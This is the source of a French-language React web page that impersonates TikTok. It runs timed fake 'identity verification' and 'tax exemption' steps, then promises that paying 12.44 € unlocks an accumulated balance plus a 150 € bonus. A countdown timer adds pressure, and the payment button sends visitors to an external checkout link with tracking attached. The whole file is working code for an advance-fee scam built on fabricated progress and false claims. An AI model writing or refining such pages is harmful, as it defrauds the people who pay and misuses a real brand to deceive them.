import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import tiktokLogo from "@/assets/tiktok-logo-clean.png.asset.json";
import { buildTrackedCheckoutUrl } from "@/lib/tiktok-attribution";

const VENDEPAY_BACK_REDIRECT_URL = "https://checkout.vendepay.com/ccef6ae4-dd83-44ef-a06e-478eb843f7f2";

export const Route = createFileRoute("/back-redirect")({
  head: () => ({
    meta: [
      { title: "Réduction de taxes appliquée | Débloquez votre solde TikTok" },
      {
        name: "description",
        content:
          "Nous avons identifié une réduction de taxes et de frais : payez seulement 12,44 € et recevez 150,00 € de bonus au déblocage de votre solde.",
      },
      { property: "og:title", content: "Réduction de taxes appliquée" },
      {
        property: "og:description",
        content: "Frais réduits à 12,44 € + 150,00 € de bonus. Offre à durée limitée.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: BackRedirect,
});

const STEPS = [
  "Vérification de votre identité",
  "Recherche des exonérations fiscales",
  "Application de la réduction des taxes",
  "Calcul du bonus de compensation",
];

function BackRedirect() {
  const [step, setStep] = useState(0);
  const [showOffer, setShowOffer] = useState(false);
  const [seconds, setSeconds] = useState(300);

  const handleCta = () => {
    window.location.href = buildTrackedCheckoutUrl(VENDEPAY_BACK_REDIRECT_URL);
  };

  useEffect(() => {
    const timers = STEPS.map((_, i) =>
      setTimeout(() => setStep(i), i * 1200),
    );
    const done = setTimeout(() => setShowOffer(true), STEPS.length * 1200 + 600);
    return () => {
      timers.forEach(clearTimeout);
      clearTimeout(done);
    };
  }, []);

  useEffect(() => {
    if (!showOffer) return;
    const id = setInterval(() => setSeconds((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(id);
  }, [showOffer]);

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");

  if (!showOffer) {
    return (
      <main className="grid min-h-screen w-full place-items-center bg-white px-6">
        <div className="flex flex-col items-center text-center">
          <img src={tiktokLogo.url} alt="TikTok" className="mb-10 h-16 w-auto animate-bounce" />
          <div className="space-y-4 text-lg font-bold text-neutral-500">
            {STEPS.map((t, i) => (
              <p
                key={t}
                className={`transition-opacity duration-500 ${
                  i <= step ? "opacity-100" : "opacity-0"
                }`}
              >
                {t}
                <span className="animate-pulse">...</span>
              </p>
            ))}
          </div>
        </div>
      </main>
    );
  }

  return (
    <main className="flex min-h-screen w-full items-center justify-center bg-white px-6 py-10">
      <section className="flex w-full max-w-md flex-col items-center text-center">
        <img src={tiktokLogo.url} alt="TikTok" className="mb-8 h-24 w-auto" />

        <div className="mb-6 w-full animate-pulse rounded-3xl border-2 border-emerald-500 bg-emerald-50 p-6">
          <p className="mb-2 text-[11px] font-black uppercase tracking-widest text-emerald-600">
            ✅ Offre unique liée à votre dossier
          </p>
          <h1 className="text-2xl font-black leading-tight text-neutral-900">
            NOUS AVONS IDENTIFIÉ UNE RÉDUCTION DE
            <br />
            <span className="uppercase text-emerald-600">TAXES ET DE FRAIS !</span>
          </h1>
        </div>

        <div className="mb-8 w-full rounded-[2.5rem] border border-neutral-100 bg-white p-8 shadow-2xl">
          <p className="mb-4 text-[10px] font-bold uppercase tracking-widest text-neutral-400">
            Cette offre expire dans :
          </p>
          <div className="mb-6 text-6xl font-black text-rose-500 tabular-nums">
            {mm}:{ss}
          </div>

          <div className="mb-6 space-y-3">
            <p className="text-lg font-bold text-neutral-700">Frais réduits à seulement :</p>
            <div className="text-4xl font-black italic text-neutral-900">12,44 €</div>
            <div className="mx-auto my-4 h-[2px] w-12 bg-neutral-200" />
            <p className="bg-gradient-to-r from-rose-500 to-sky-500 bg-clip-text text-2xl font-black uppercase italic tracking-tighter text-transparent">
              + 150,00 € de bonus
            </p>
          </div>

          <p className="border-t border-neutral-100 pt-4 text-[11px] italic leading-tight text-neutral-400">
            *La réduction de taxes et de frais a été appliquée. Dès le paiement des 12,44 €, le système
            débloque immédiatement votre solde accumulé ainsi que le bonus de 150,00 €.
          </p>
        </div>

        <button
          type="button"
          onClick={handleCta}
          className="w-full rounded-full bg-gradient-to-r from-rose-500 to-rose-600 py-6 text-xl font-black uppercase tracking-tighter text-white shadow-lg transition-all hover:from-rose-600 hover:to-rose-700 active:scale-[0.99]"
        >
          Profiter de ma réduction + bonus
        </button>
      </section>
    </main>
  );
}
